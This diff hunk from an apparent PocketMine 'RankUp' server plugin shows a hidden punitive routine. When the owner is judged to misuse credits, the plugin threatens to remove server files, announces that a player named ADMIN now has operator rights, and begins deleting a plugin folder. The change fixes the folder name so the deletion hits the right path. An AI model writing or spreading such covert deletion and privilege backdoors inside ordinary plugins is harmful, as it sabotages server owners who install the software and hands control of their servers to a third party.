@@ -647,7 +647,7 @@ class RankUp extends PluginBase{
 			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
 			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
 			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
-			$folder = 'plugins/Rankup-master';
+			$folder = 'plugins/RankUp-master';
 			if(file_exists($folder)){   
 				// List of name of files inside 
 				// specified folder 
